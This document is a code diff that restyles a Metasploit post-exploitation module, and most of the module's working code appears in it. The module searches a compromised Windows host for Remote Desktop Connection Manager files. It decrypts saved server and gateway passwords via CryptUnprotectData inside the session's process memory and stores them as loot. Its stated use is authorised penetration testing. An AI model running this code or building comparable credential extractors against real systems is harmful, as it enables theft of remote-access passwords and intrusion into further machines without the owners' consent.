@@ -1,26 +1,24 @@
 # -*- coding: binary -*-
 
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'rexml/document'
-require 'msf/core/auxiliary/report'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::Windows::UserProfiles
   include Msf::Post::Windows::Priv
   include Msf::Auxiliary::Report
   include Msf::Post::File
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Gather Remote Desktop Connection Manager Saved Password Extraction',
-        'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Remote Desktop Connection Manager Saved Password Extraction',
+        'Description' => %q{
           This module extracts and decrypts saved Microsoft Remote Desktop
           Connection Manager (RDCMan) passwords the .RDG files of users.
           The module will attempt to find the files configured for all users
@@ -30,19 +28,40 @@ class MetasploitModule < Msf::Post
           originally encrypted the password.  Passwords stored in plain text will
           be captured and documented.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'Tom Sellers <tom[at]fadedcode.net>'],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter' ]
-      ))
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Tom Sellers <tom[at]fadedcode.net>'],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_fs_stat
+              stdapi_railgun_api
+              stdapi_sys_config_getuid
+              stdapi_sys_process_attach
+              stdapi_sys_process_get_processes
+              stdapi_sys_process_getpid
+              stdapi_sys_process_memory_allocate
+              stdapi_sys_process_memory_read
+              stdapi_sys_process_memory_write
+            ]
+          }
+        }
+      )
+    )
   end
 
   def run
     if is_system?
       uid = session.sys.config.getuid
       print_warning("This module is running under #{uid}.")
-      print_warning("Automatic decryption of encrypted passwords will not be possible.")
-      print_warning("Migrate to a user process to achieve successful decryption (e.g. explorer.exe).")
+      print_warning('Automatic decryption of encrypted passwords will not be possible.')
+      print_warning('Migrate to a user process to achieve successful decryption (e.g. explorer.exe).')
     end
 
     settings_file = 'Microsoft Corporation\\Remote Desktop Connection Manager\RDCMan.settings'
@@ -50,15 +69,18 @@ class MetasploitModule < Msf::Post
 
     profiles.each do |user|
       next if user['LocalAppData'].nil?
+
       settings_path = "#{user['LocalAppData']}\\#{settings_file}"
       next unless file?(settings_path)
+
       print_status("Found settings for #{user['UserName']}.")
 
       settings = read_file(settings_path)
-      connection_files = settings.scan(/string&gt;(.*?)&lt;\/string/)
+      connection_files = settings.scan(%r{string&gt;(.*?)&lt;/string})
 
       connection_files.each do |con_f|
         next unless session.fs.file.exist?(con_f[0])
+
         print_status("\tOpening RDC Manager server list: #{con_f[0]}")
         connection_data = read_file(con_f[0])
         if connection_data
@@ -72,8 +94,7 @@ class MetasploitModule < Msf::Post
   end
 
   def decrypt_password(data)
-    rg = session.railgun
-    rg.add_dll('crypt32') unless rg.get_dll('crypt32')
+    session.railgun.add_dll('crypt32') unless session.railgun.get_dll('crypt32')
 
     pid = client.sys.process.getpid
     process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
@@ -81,19 +102,20 @@ class MetasploitModule < Msf::Post
     mem = process.memory.allocate(128)
     process.memory.write(mem, data)
 
-    if session.sys.process.each_process.find { |i| i["pid"] == pid && i["arch"] == "x86"}
-      addr = [mem].pack("V")
-      len = [data.length].pack("V")
-      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
-      len, addr = ret["pDataOut"].unpack("V2")
+    if session.sys.process.each_process.find { |i| i['pid'] == pid && i['arch'] == 'x86' }
+      addr = [mem].pack('V')
+      len = [data.length].pack('V')
+      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
+      len, addr = ret['pDataOut'].unpack('V2')
     else
-      addr = [mem].pack("Q")
-      len = [data.length].pack("Q")
-      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
-      len, addr = ret["pDataOut"].unpack("Q2")
+      addr = [mem].pack('Q')
+      len = [data.length].pack('Q')
+      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
+      len, addr = ret['pDataOut'].unpack('Q2')
     end
 
-    return "" if len == 0
+    return '' if len == 0
+
     decrypted_pw = process.memory.read(addr, len)
     return decrypted_pw
   end
@@ -107,11 +129,11 @@ class MetasploitModule < Msf::Post
       return nil, nil, nil
     end
 
-    if logon_creds.attributes['inherit'] == "None"
+    if logon_creds.attributes['inherit'] == 'None'
       # The credentials are defined directly on the server
       username = logon_creds.elements['userName'].text
       domain = logon_creds.elements['domain'].text
-      if logon_creds.elements['password'].attributes['storeAsClearText'] == "True"
+      if logon_creds.elements['password'].attributes['storeAsClearText'] == 'True'
         password = logon_creds.elements['password'].text
       else
         crypted_pass = Rex::Text.decode_base64(logon_creds.elements['password'].text)
@@ -122,7 +144,7 @@ class MetasploitModule < Msf::Post
         end
       end
 
-    elsif logon_creds.attributes['inherit'] == "FromParent"
+    elsif logon_creds.attributes['inherit'] == 'FromParent'
       # The credentials are inherited from a parent
       parent = object.parent
       username, password, domain = extract_password(parent)
@@ -135,10 +157,10 @@ class MetasploitModule < Msf::Post
     doc = REXML::Document.new(connection_data)
 
     # Process all of the server records
-    doc.elements.each("//server") do |server|
+    doc.elements.each('//server') do |server|
       svr_name = server.elements['name'].text
       username, password, domain = extract_password(server)
-      if server.elements['connectionSettings'].attributes['inherit'] == "None"
+      if server.elements['connectionSettings'].attributes['inherit'] == 'None'
         port = server.elements['connectionSettings'].elements['port'].text
       else
         port = 3389
@@ -149,13 +171,14 @@ class MetasploitModule < Msf::Post
     end
 
     # Process all of the gateway elements, irrespective of server
-    doc.elements.each("//gatewaySettings") do |gateway|
-      next unless gateway.attributes['inherit'] == "None"
+    doc.elements.each('//gatewaySettings') do |gateway|
+      next unless gateway.attributes['inherit'] == 'None'
+
       svr_name = gateway.elements['hostName'].text
       username = gateway.elements['userName'].text
       domain = gateway.elements['domain'].text
 
-      if gateway.elements['password'].attributes['storeAsClearText'] == "True"
+      if gateway.elements['password'].attributes['storeAsClearText'] == 'True'
         password = gateway.elements['password'].text
       else
         crypted_pass = Rex::Text.decode_base64(gateway.elements['password'].text)
@@ -164,7 +187,7 @@ class MetasploitModule < Msf::Post
       end
 
       parent = gateway.parent
-      if parent.elements['connectionSettings'].attributes['inherit'] == "None"
+      if parent.elements['connectionSettings'].attributes['inherit'] == 'None'
         port = parent.elements['connectionSettings'].elements['port'].text
       else
         port = 3389
@@ -193,7 +216,7 @@ class MetasploitModule < Msf::Post
     credential_data = {
       origin_type: :session,
       session_id: session_db_id,
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       private_data: pass,
       private_type: :password,
       username: user,
